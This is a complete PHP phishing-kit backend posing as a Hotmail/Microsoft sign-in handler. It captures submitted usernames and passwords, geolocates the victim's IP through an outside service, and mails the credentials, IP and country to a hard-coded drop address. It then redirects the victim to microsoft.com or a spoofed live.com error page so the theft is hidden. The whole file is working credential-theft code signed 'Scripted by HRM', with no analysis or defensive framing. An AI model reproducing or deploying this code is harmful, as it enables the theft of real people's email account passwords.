<?php
session_start();

function sanitize_input($data) {
    return htmlspecialchars(stripslashes(trim($data)));
}

function validate_email($email) {
    return filter_var($email, FILTER_VALIDATE_EMAIL);
}

function get_ip_address() {
    $client = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote = $_SERVER['REMOTE_ADDR'];
    
    if (filter_var($client, FILTER_VALIDATE_IP)) {
        return $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
        return $forward;
    } else {
        return $remote;
    }
}

function visitor_country() {
    $ip = get_ip_address();
    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));
    return $ip_data && $ip_data->geoplugin_countryName != null ? $ip_data->geoplugin_countryName : "Unknown";
}

function visitor_countryCode() {
    $ip = get_ip_address();
    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));
    return $ip_data && $ip_data->geoplugin_countryCode != null ? $ip_data->geoplugin_countryCode : "Unknown";
}

function visitor_continentCode() {
    $ip = get_ip_address();
    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));
    return $ip_data && $ip_data->geoplugin_continentCode != null ? $ip_data->geoplugin_continentCode : "Unknown";
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $login = isset($_POST['user']) ? sanitize_input($_POST['user']) : '';
    $passwd = isset($_POST['pass']) ? sanitize_input($_POST['pass']) : '';

    // Validate CSRF token
    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        echo "Invalid CSRF token.";
        exit();
    }

    if (!validate_email($login)) {
        header("Referrer-Policy: no-referrer");
        header("Location: https://account.live.com/error.aspx?errcode=1086&uaid=3c8c6d1e977548ae965764118acef699");
        exit();
    }

    $country = visitor_country();
    $countryCode = visitor_countryCode();
    $continentCode = visitor_continentCode();
    $ip = getenv("REMOTE_ADDR");
    $browser = $_SERVER['HTTP_USER_AGENT'];

    $own = 'dean-deja-int.com@clbanco.com';
    $web = $_SERVER["HTTP_HOST"];
    $inj = $_SERVER["REQUEST_URI"]; 
    $domain = 'HOTMAIL';
    $sender = 'HOTMAIL';
    $subj = "Login: - | $login | $country | $ip";
    $headers = "From: HOTMAIL<$sender>\n";
    $headers .= "X-Priority: 1\n"; // 1 Urgent Message, 3 Normal
    $headers .= "Content-Type: text/html; charset=\"iso-8859-1\"\n";
    $over = 'verified.php';

    $msg = "<HTML><BODY>
    <TABLE>
    <tr><td><b>***Login Details</b></td></tr>
    <tr><td></td></tr>
    <tr><td>===================================================</td></tr>
    <tr><td>Username: <b>$login</b><td/></tr>
    <tr><td>Password: <b>$passwd</b></td></tr>
    <tr><td>Country: $country | User IP: <a href='http://whoer.net/check?host=$ip' target='_blank'>$ip</a> </td></tr>
    <tr><td>=================Scripted by HRM==================</td></tr>
    </BODY>
    </HTML>";

    $base_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]" . dirname($_SERVER['PHP_SELF']);

    if (empty($login) || empty($passwd)) {
        header("Referrer-Policy: no-referrer");
        header("Location: $base_url");
    } else {
        mail($own, $subj, $msg, $headers);
        header("Referrer-Policy: no-referrer");
        header("Location: https://www.microsoft.com");
    }
}
?>
